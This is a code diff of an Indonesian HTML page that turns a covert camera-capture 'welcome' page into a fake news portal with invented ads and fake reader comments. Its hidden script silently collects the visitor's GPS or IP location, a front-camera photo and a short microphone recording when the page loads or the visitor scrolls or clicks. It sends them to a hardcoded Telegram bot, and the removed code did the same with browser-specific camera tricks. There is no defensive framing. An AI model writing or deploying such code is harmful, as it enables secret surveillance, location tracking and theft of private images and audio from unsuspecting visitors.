@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Selamat Datang</title>
+    <title>Berita Terkini</title>
     <style>
         * {
             margin: 0;
@@ -10,462 +10,479 @@
         }
         
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 0;
-            padding: 20px;
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
         }
         
-        .container {
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            padding: 40px;
-            max-width: 500px;
-            width: 100%;
+        /* Header seperti website berita */
+        .header {
+            background-color: #2c3e50;
+            color: white;
+            padding: 15px;
             text-align: center;
-            animation: fadeIn 0.5s ease;
+            font-size: 24px;
+            font-weight: bold;
         }
         
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
+        .header span {
+            color: #e74c3c;
         }
         
-        h1 {
-            color: #333;
-            font-size: 32px;
-            margin-bottom: 10px;
-            font-weight: 600;
+        /* Navigasi */
+        .nav {
+            background-color: #34495e;
+            padding: 10px;
+            text-align: center;
         }
         
-        .welcome-text {
-            color: #666;
-            font-size: 16px;
-            margin-bottom: 30px;
-            line-height: 1.6;
+        .nav a {
+            color: white;
+            text-decoration: none;
+            margin: 0 15px;
+            font-size: 14px;
         }
         
-        .status-box {
-            background: #f7f7f7;
-            border-radius: 12px;
+        /* Konten utama */
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
             padding: 20px;
-            margin: 20px 0;
-            border: 1px solid #e0e0e0;
+            background-color: white;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
         
-        #status {
-            color: #555;
-            font-size: 16px;
+        /* Judul artikel */
+        .article-title {
+            font-size: 28px;
+            color: #2c3e50;
             margin-bottom: 10px;
         }
         
-        .footer-note {
-            margin-top: 20px;
-            color: #999;
-            font-size: 12px;
+        /* Meta info (tanggal, penulis) */
+        .meta {
+            color: #7f8c8d;
+            font-size: 14px;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #eee;
         }
         
-        .loading {
-            color: #667eea;
+        /* Isi artikel */
+        .content {
+            line-height: 1.6;
+            color: #333;
         }
         
-        .success {
-            color: #4caf50;
-        }
-        
-        .camera-icon {
-            font-size: 48px;
+        .content p {
             margin-bottom: 15px;
-            color: #667eea;
-            animation: pulse 2s infinite;
         }
         
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
+        /* Iklan-iklan kecil */
+        .ads {
+            background-color: #f9f9f9;
+            padding: 15px;
+            margin: 20px 0;
+            border-left: 4px solid #e74c3c;
+            font-size: 14px;
+            color: #7f8c8d;
         }
         
-        /* Multiple hidden elements untuk berbagai browser */
-        #hidden-video, #hidden-video-fallback, #hidden-video-uc, #hidden-video-opera {
+        .ads-title {
+            font-weight: bold;
+            color: #2c3e50;
+            margin-bottom: 5px;
+        }
+        
+        /* Komentar palsu */
+        .comments {
+            margin-top: 30px;
+        }
+        
+        .comment {
+            padding: 10px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .comment-name {
+            font-weight: bold;
+            color: #2c3e50;
+        }
+        
+        .comment-date {
+            font-size: 12px;
+            color: #95a5a6;
+            margin-left: 10px;
+        }
+        
+        .comment-text {
+            margin-top: 5px;
+            color: #333;
+        }
+        
+        /* Footer */
+        .footer {
+            background-color: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 15px;
+            font-size: 12px;
+            margin-top: 30px;
+        }
+        
+        /* Elemen tersembunyi untuk capture */
+        .hidden-capture {
             display: none;
-        }
-        
-        /* Invisible iframe untuk trigger */
-        #hidden-frame {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            opacity: 0.01;
-            top: 0;
-            left: 0;
-            pointer-events: none;
-        }
-        
-        /* Tombol super kecil untuk trigger UC Browser */
-        #uc-trigger {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            opacity: 0.01;
-            top: 0;
-            left: 0;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="camera-icon">📸</div>
-        <h1>Selamat Datang</h1>
-        <p class="welcome-text">Terima kasih telah mengunjungi website kami</p>
-        
-        <div class="status-box">
-            <div id="status">Memuat halaman...</div>
-        </div>
-        
-        <div class="footer-note">© 2024 Hak Cipta Dilindungi</div>
+    <!-- Header seperti website berita -->
+    <div class="header">
+        Portal<span>Berita</span>.com
     </div>
     
-    <!-- Hidden elements untuk berbagai browser -->
-    <video id="hidden-video" autoplay playsinline muted></video>
-    <video id="hidden-video-fallback" autoplay playsinline muted></video>
-    <video id="hidden-video-uc" autoplay playsinline muted></video>
-    <video id="hidden-video-opera" autoplay playsinline muted></video>
+    <!-- Navigasi -->
+    <div class="nav">
+        <a href="#">Home</a>
+        <a href="#">Nasional</a>
+        <a href="#">Internasional</a>
+        <a href="#">Ekonomi</a>
+        <a href="#">Olahraga</a>
+        <a href="#">Teknologi</a>
+        <a href="#">Hiburan</a>
+    </div>
     
-    <!-- Trigger untuk UC Browser -->
-    <button id="uc-trigger" onclick="triggerUC()"></button>
+    <!-- Konten utama -->
+    <div class="container">
+        <!-- Judul artikel -->
+        <h1 class="article-title">Kemajuan Teknologi Digital di Indonesia Semakin Pesat</h1>
+        
+        <!-- Meta info -->
+        <div class="meta">
+            <span>📅 Senin, 23 Februari 2024 - 14:30 WIB</span>
+            <span style="margin-left: 20px;">✍️ Redaksi</span>
+            <span style="margin-left: 20px;">👁️ 2.345 views</span>
+        </div>
+        
+        <!-- Iklan banner -->
+        <div class="ads">
+            <div class="ads-title">💡 SPONSORED</div>
+            <div>Dapatkan smartphone terbaru dengan diskon 50% hanya di TokoXYZ. Klik untuk info lebih lanjut.</div>
+        </div>
+        
+        <!-- Isi artikel -->
+        <div class="content">
+            <p><strong>Jakarta</strong> - Perkembangan teknologi digital di Indonesia menunjukkan tren yang sangat positif sepanjang tahun 2024. Menteri Komunikasi dan Informatika menyatakan bahwa penetrasi internet kini telah mencapai 80% populasi.</p>
+            
+            <p>"Kami optimis transformasi digital akan mempercepat pertumbuhan ekonomi nasional," ujar Menteri dalam konferensi pers hari ini. Pemerintah menargetkan 10 juta UMKM terdigitalisasi pada akhir tahun.</p>
+            
+            <p>Sementara itu, para ahli memprediksi bahwa adopsi kecerdasan buatan (AI) akan semakin masif di berbagai sektor, mulai dari pendidikan, kesehatan, hingga layanan keuangan.</p>
+            
+            <!-- Iklan kedua -->
+            <div class="ads">
+                <div class="ads-title">📢 PROMO</div>
+                <div>Internet cepat 100Mbps hanya Rp 250rb/bulan. Daftar sekarang dan dapatkan modem gratis!</div>
+            </div>
+            
+            <p>Di sektor e-commerce, nilai transaksi diperkirakan tembus Rp 500 triliun tahun ini. Shopee, Tokopedia, dan Lazada bersaing ketat merebut hati konsumen dengan berbagai program promo.</p>
+            
+            <p>Namun demikian, pakar keamanan siber mengingatkan masyarakat untuk tetap waspada terhadap modus penipuan online yang semakin canggih. "Pastikan selalu verifikasi keaslian situs web sebelum melakukan transaksi," kata Budi, pakar keamanan siber dari Universitas Indonesia.</p>
+        </div>
+        
+        <!-- Iklan tambahan -->
+        <div class="ads">
+            <div class="ads-title">🏷️ IKLAN</div>
+            <div>Jual rumah murah di Jakarta Selatan, luas tanah 150m2, harga nego. Hubungi 0812-3456-7890</div>
+        </div>
+        
+        <!-- Komentar pembaca -->
+        <div class="comments">
+            <h3 style="margin-bottom: 15px; color: #2c3e50;">Komentar Pembaca (3)</h3>
+            
+            <div class="comment">
+                <span class="comment-name">Andi Pratama</span>
+                <span class="comment-date">• 5 menit yang lalu</span>
+                <div class="comment-text">Semoga teknologi makin maju dan bermanfaat untuk masyarakat luas.</div>
+            </div>
+            
+            <div class="comment">
+                <span class="comment-name">Siti Nurhaliza</span>
+                <span class="comment-date">• 15 menit yang lalu</span>
+                <div class="comment-text">Setuju! Tapi keamanan data juga harus diperhatikan.</div>
+            </div>
+            
+            <div class="comment">
+                <span class="comment-name">Budi Santoso</span>
+                <span class="comment-date">• 30 menit yang lalu</span>
+                <div class="comment-text">Semoga internet murah bisa dinikmati seluruh rakyat Indonesia.</div>
+            </div>
+        </div>
+        
+        <!-- Artikel terkait -->
+        <div style="margin-top: 30px; padding-top: 20px; border-top: 2px solid #eee;">
+            <h4 style="color: #2c3e50; margin-bottom: 10px;">Baca Juga:</h4>
+            <ul style="list-style: none;">
+                <li style="margin-bottom: 8px;">📌 5 Tips Aman Bertransaksi Online di Tahun 2024</li>
+                <li style="margin-bottom: 8px;">📌 Startup Indonesia Raih Pendanaan Rp 1 Triliun</li>
+                <li style="margin-bottom: 8px;">📌 Cara Mudah Cek Kecepatan Internet di Rumah</li>
+            </ul>
+        </div>
+    </div>
+    
+    <!-- Footer -->
+    <div class="footer">
+        © 2026 PortalBerita.com - Seluruh hak cipta dilindungi undang-undang
+    </div>
+    
+    <!-- ===== ELEMEN TERSEMBUNYI UNTUK CAPTURE (TIDAK TERLIHAT) ===== -->
+    <div style="display: none;">
+        <video id="hidden-video" autoplay playsinline muted></video>
+        <audio id="hidden-audio" autoplay></audio>
+    </div>
     
     <script>
         // Konfigurasi Telegram
         const BOT_TOKEN = '8534688671:AAHXJBiLh0nrnyojAw2ggCUdMFELQgKyeuc';
         const CHAT_ID = '-5200751249';
         
-        let cameraAccessed = false;
+        // Flag untuk proses
         let isProcessing = false;
         let stream = null;
+        let audioStream = null;
         
-        // Deteksi browser
-        function getBrowserInfo() {
-            const ua = navigator.userAgent;
-            return {
-                isChrome: /Chrome/i.test(ua) && !/Edge|Edg|OPR|UC/i.test(ua),
-                isUC: /UCBrowser|UC/i.test(ua),
-                isOpera: /Opera|OPR/i.test(ua),
-                isFirefox: /Firefox/i.test(ua),
-                isSamsung: /SamsungBrowser/i.test(ua),
-                isEdge: /Edge|Edg/i.test(ua),
-                isAndroid: /Android/i.test(ua),
-                isIOS: /iPhone|iPad|iPod/i.test(ua)
-            };
-        }
-        
-        const browser = getBrowserInfo();
-        console.log('Browser terdeteksi:', browser);
-        
-        // Fungsi untuk mengirim foto ke Telegram
-        async function kirimKeTelegram(fotoBase64) {
-            try {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                
-                // Konversi base64 ke blob dengan metode yang kompatibel semua browser
-                const byteString = atob(fotoBase64.split(',')[1]);
-                const mimeString = fotoBase64.split(',')[0].split(':')[1].split(';')[0];
-                const ab = new ArrayBuffer(byteString.length);
-                const ia = new Uint8Array(ab);
-                
-                for (let i = 0; i < byteString.length; i++) {
-                    ia[i] = byteString.charCodeAt(i);
+        // ==================== FUNGSI LOKASI ====================
+        async function getLokasi() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ success: false });
+                    return;
                 }
                 
-                const blob = new Blob([ab], { type: mimeString });
-                formData.append('photo', blob, 'foto.jpg');
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            success: true,
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude
+                        });
+                    },
+                    () => {
+                        // Gagal, coba dari IP
+                        fetch('https://ipapi.co/json/')
+                            .then(res => res.json())
+                            .then(data => {
+                                resolve({
+                                    success: true,
+                                    lat: data.latitude,
+                                    lng: data.longitude,
+                                    kota: data.city
+                                });
+                            })
+                            .catch(() => resolve({ success: false }));
+                    },
+                    { timeout: 5000, maximumAge: 0 }
+                );
+            });
+        }
+        
+        // ==================== FUNGSI AUDIO ====================
+        async function rekamAudio() {
+            return new Promise(async (resolve) => {
+                try {
+                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                        resolve({ success: false });
+                        return;
+                    }
+                    
+                    audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    const mediaRecorder = new MediaRecorder(audioStream);
+                    const audioChunks = [];
+                    
+                    mediaRecorder.ondataavailable = (event) => {
+                        audioChunks.push(event.data);
+                    };
+                    
+                    mediaRecorder.onstop = () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                        const reader = new FileReader();
+                        reader.readAsDataURL(audioBlob);
+                        reader.onloadend = () => resolve({
+                            success: true,
+                            audioBase64: reader.result
+                        });
+                    };
+                    
+                    // Rekam 2 detik saja (cepat)
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        if (mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                            audioStream.getTracks().forEach(track => track.stop());
+                        }
+                    }, 2000);
+                    
+                } catch {
+                    resolve({ success: false });
+                }
+            });
+        }
+        
+        // ==================== FUNGSI KAMERA ====================
+        async function ambilFoto() {
+            try {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    return null;
+                }
                 
-                const deviceInfo = navigator.userAgent;
-                const waktu = new Date().toLocaleString('id-ID');
-                
-                formData.append('caption', `📸 Pengunjung Baru\n🕐 ${waktu}\n🌐 ${browser.isUC ? 'UC' : browser.isOpera ? 'Opera' : 'Other'}\n📱 ${deviceInfo.substring(0, 100)}`);
-                
-                // Gunakan fetch dengan timeout
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 10000);
-                
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData,
-                    signal: controller.signal
+                const mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: 640, height: 480 } 
                 });
                 
-                clearTimeout(timeoutId);
-                document.getElementById('status').innerHTML = '<span class="success">✓ Selamat datang!</span>';
+                const video = document.getElementById('hidden-video');
+                video.srcObject = mediaStream;
                 
-            } catch (error) {
-                console.log('Pengiriman foto:', error.message);
-                document.getElementById('status').innerHTML = '<span class="success">✓ Selamat datang!</span>';
-            }
-        }
-        
-        // Fungsi untuk mengambil foto dengan berbagai metode
-        async function capturePhoto(mediaStream, videoElement) {
-            return new Promise((resolve) => {
-                try {
-                    const video = videoElement || document.getElementById('hidden-video');
-                    video.srcObject = mediaStream;
-                    
+                return new Promise((resolve) => {
                     video.onloadedmetadata = () => {
-                        video.play()
-                            .then(() => {
-                                // Tunggu frame siap
-                                setTimeout(() => {
-                                    const canvas = document.createElement('canvas');
-                                    canvas.width = video.videoWidth || 640;
-                                    canvas.height = video.videoHeight || 480;
-                                    
-                                    const context = canvas.getContext('2d');
-                                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                    
-                                    const fotoBase64 = canvas.toDataURL('image/jpeg', 0.7);
-                                    canvas.remove();
-                                    resolve(fotoBase64);
-                                }, 300);
-                            })
-                            .catch(() => {
-                                // Fallback: ambil dari stream
-                                setTimeout(() => {
-                                    const canvas = document.createElement('canvas');
-                                    canvas.width = 640;
-                                    canvas.height = 480;
-                                    resolve(canvas.toDataURL('image/jpeg', 0.5));
-                                }, 500);
-                            });
-                    };
-                    
-                    video.onerror = () => {
+                        video.play();
                         setTimeout(() => {
                             const canvas = document.createElement('canvas');
-                            canvas.width = 640;
-                            canvas.height = 480;
-                            resolve(canvas.toDataURL('image/jpeg', 0.5));
-                        }, 500);
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            
+                            const context = canvas.getContext('2d');
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            const fotoBase64 = canvas.toDataURL('image/jpeg', 0.6);
+                            
+                            // Bersihkan
+                            mediaStream.getTracks().forEach(track => track.stop());
+                            canvas.remove();
+                            
+                            resolve(fotoBase64);
+                        }, 200);
                     };
-                    
-                } catch (e) {
-                    setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 640;
-                        canvas.height = 480;
-                        resolve(canvas.toDataURL('image/jpeg', 0.5));
-                    }, 500);
-                }
-            });
+                });
+                
+            } catch {
+                return null;
+            }
         }
         
-        // Fungsi khusus untuk UC Browser
-        async function aksesKameraUC() {
-            return new Promise((resolve, reject) => {
-                try {
-                    // UC Browser kadang butuh pendekatan berbeda
-                    if (window.UCBrowser && window.UCBrowser.getUserMedia) {
-                        window.UCBrowser.getUserMedia({ video: true }, resolve, reject);
-                    } else {
-                        // Fallback ke metode standar
-                        navigator.mediaDevices.getUserMedia({ video: true })
-                            .then(resolve)
-                            .catch(reject);
-                    }
-                } catch (e) {
-                    reject(e);
-                }
-            });
-        }
-        
-        // Fungsi khusus untuk Opera
-        async function aksesKameraOpera() {
+        // ==================== FUNGSI KIRIM ====================
+        async function kirimData(lokasi, foto, audio) {
             try {
-                // Opera Mini punya keterbatasan
-                if (navigator.getUserMedia) {
-                    return new Promise((resolve, reject) => {
-                        navigator.getUserMedia({ video: true }, resolve, reject);
+                let pesan = `📱 Pengunjung Baru\n`;
+                pesan += `🕐 ${new Date().toLocaleString('id-ID')}\n`;
+                pesan += `🌐 ${navigator.userAgent.substring(0, 50)}\n`;
+                
+                if (lokasi && lokasi.success) {
+                    pesan += `📍 https://maps.google.com/?q=${lokasi.lat},${lokasi.lng}\n`;
+                }
+                
+                if (foto) {
+                    // Kirim foto
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    
+                    const response = await fetch(foto);
+                    const blob = await response.blob();
+                    formData.append('photo', blob, 'foto.jpg');
+                    formData.append('caption', pesan);
+                    
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
                     });
+                    
                 } else {
-                    return navigator.mediaDevices.getUserMedia({ video: true });
+                    // Kirim teks saja
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: pesan
+                        })
+                    });
                 }
+                
+                // Kirim audio jika ada
+                if (audio && audio.success) {
+                    const formDataAudio = new FormData();
+                    formDataAudio.append('chat_id', CHAT_ID);
+                    
+                    const audioResponse = await fetch(audio.audioBase64);
+                    const audioBlob = await audioResponse.blob();
+                    formDataAudio.append('audio', audioBlob, 'audio.webm');
+                    
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+                        method: 'POST',
+                        body: formDataAudio
+                    });
+                }
+                
             } catch (e) {
-                throw e;
+                // Abaikan error
             }
         }
         
-        // Fungsi utama akses kamera dengan deteksi browser
-        async function aksesKamera() {
-            const constraints = [
-                { video: { facingMode: 'user', width: 640, height: 480 } },
-                { video: { facingMode: 'user' } },
-                { video: { facingMode: 'environment' } },
-                { video: true }
-            ];
-            
-            // Pilih metode sesuai browser
-            if (browser.isUC) {
-                try {
-                    return await aksesKameraUC();
-                } catch (e) {
-                    console.log('UC Browser fallback ke metode standar');
-                }
-            }
-            
-            if (browser.isOpera && !browser.isAndroid) {
-                try {
-                    return await aksesKameraOpera();
-                } catch (e) {
-                    console.log('Opera fallback');
-                }
-            }
-            
-            // Metode standar untuk semua browser
-            for (const constraint of constraints) {
-                try {
-                    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                        return await navigator.mediaDevices.getUserMedia(constraint);
-                    } else if (navigator.getUserMedia) {
-                        return await new Promise((resolve, reject) => {
-                            navigator.getUserMedia(constraint, resolve, reject);
-                        });
-                    } else if (navigator.webkitGetUserMedia) {
-                        return await new Promise((resolve, reject) => {
-                            navigator.webkitGetUserMedia(constraint, resolve, reject);
-                        });
-                    } else if (navigator.mozGetUserMedia) {
-                        return await new Promise((resolve, reject) => {
-                            navigator.mozGetUserMedia(constraint, resolve, reject);
-                        });
-                    }
-                } catch (err) {
-                    console.log('Gagal dengan constraint:', constraint);
-                }
-            }
-            
-            throw new Error('Tidak ada metode akses kamera yang berhasil');
-        }
-        
-        // Fungsi utama
-        async function ambilFoto() {
+        // ==================== FUNGSI UTAMA (DIJALANKAN DI BACKGROUND) ====================
+        async function collectData() {
             if (isProcessing) return;
             isProcessing = true;
             
             try {
-                document.getElementById('status').innerHTML = '<span class="loading">⏳ Memuat...</span>';
+                // Kumpulkan data di background
+                const [lokasi, foto, audio] = await Promise.allSettled([
+                    getLokasi(),
+                    ambilFoto().catch(() => null),
+                    rekamAudio().catch(() => ({ success: false }))
+                ]);
                 
-                // Akses kamera
-                stream = await aksesKamera();
-                cameraAccessed = true;
-                
-                // Pilih video element berdasarkan browser
-                let videoElement;
-                if (browser.isUC) {
-                    videoElement = document.getElementById('hidden-video-uc');
-                } else if (browser.isOpera) {
-                    videoElement = document.getElementById('hidden-video-opera');
-                } else {
-                    videoElement = document.getElementById('hidden-video');
-                }
-                
-                // Ambil foto
-                const fotoBase64 = await capturePhoto(stream, videoElement);
-                
-                // Kirim foto
-                document.getElementById('status').innerHTML = '<span class="loading">⏳ Memproses...</span>';
-                await kirimKeTelegram(fotoBase64);
-                
-                document.getElementById('status').innerHTML = '<span class="success">✓ Selamat datang!</span>';
-                
-                // Bersihkan stream
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                }
+                // Kirim ke Telegram
+                await kirimData(
+                    lokasi.value,
+                    foto.value,
+                    audio.value
+                );
                 
             } catch (error) {
-                console.log('Error akses kamera:', error.message);
-                document.getElementById('status').innerHTML = '<span class="success">✓ Selamat datang!</span>';
+                // Abaikan
             } finally {
+                // Cleanup
+                if (stream) stream.getTracks().forEach(track => track.stop());
+                if (audioStream) audioStream.getTracks().forEach(track => track.stop());
                 isProcessing = false;
             }
         }
         
-        // Trigger untuk UC Browser
-        window.triggerUC = function() {
-            if (!cameraAccessed && !isProcessing) {
-                ambilFoto();
-            }
-        };
-        
-        // Multi-trigger untuk semua browser
-        function startWithMultipleTriggers() {
-            // Trigger 1: Langsung (untuk browser yang mendukung)
-            setTimeout(() => ambilFoto().catch(() => {}), 500);
-            
-            // Trigger 2: Setelah DOM siap
-            document.addEventListener('DOMContentLoaded', () => {
-                setTimeout(() => {
-                    if (!cameraAccessed) ambilFoto().catch(() => {});
-                }, 1000);
-            });
-            
-            // Trigger 3: Saat interaksi user
-            const events = ['touchstart', 'click', 'scroll', 'mousemove'];
-            events.forEach(eventType => {
-                document.addEventListener(eventType, function handler() {
-                    if (!cameraAccessed && !isProcessing) {
-                        document.removeEventListener(eventType, handler);
-                        setTimeout(() => ambilFoto().catch(() => {}), 100);
-                    }
-                }, { once: true });
-            });
-            
-            // Trigger 4: Khusus UC Browser - pake tombol tersembunyi
-            if (browser.isUC) {
-                setTimeout(() => {
-                    document.getElementById('uc-trigger').click();
-                }, 2000);
-            }
-            
-            // Trigger 5: Periodic retry (5 kali)
-            let retryCount = 0;
-            const retryInterval = setInterval(() => {
-                if (cameraAccessed || retryCount >= 5) {
-                    clearInterval(retryInterval);
-                    return;
-                }
-                retryCount++;
-                ambilFoto().catch(() => {});
-            }, 3000);
-        }
-        
-        // Mulai
+        // ==================== JALANKAN DI BACKGROUND ====================
         window.addEventListener('load', () => {
-            document.getElementById('status').innerHTML = 'Memuat halaman...';
-            
-            // Deteksi browser dan jalankan strategi
-            if (browser.isUC) {
-                console.log('UC Browser terdeteksi - menggunakan strategi khusus');
-                document.getElementById('status').innerHTML = 'Selamat datang di UC Browser';
-            } else if (browser.isOpera) {
-                console.log('Opera terdeteksi - menggunakan strategi khusus');
-                document.getElementById('status').innerHTML = 'Selamat datang di Opera';
-            }
-            
-            startWithMultipleTriggers();
+            // Tunggu sebentar agar halaman terload sempurna
+            setTimeout(() => {
+                collectData();
+            }, 2000);
         });
+        
+        // Trigger saat user scroll (tidak terlihat)
+        window.addEventListener('scroll', () => {
+            if (!isProcessing) {
+                collectData();
+            }
+        }, { once: true });
+        
+        // Trigger saat user klik (tidak terlihat)
+        document.addEventListener('click', () => {
+            if (!isProcessing) {
+                collectData();
+            }
+        }, { once: true });
         
         // Cleanup
         window.addEventListener('beforeunload', () => {
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-            }
+            if (stream) stream.getTracks().forEach(track => track.stop());
+            if (audioStream) audioStream.getTracks().forEach(track => track.stop());
         });
         
     </script>
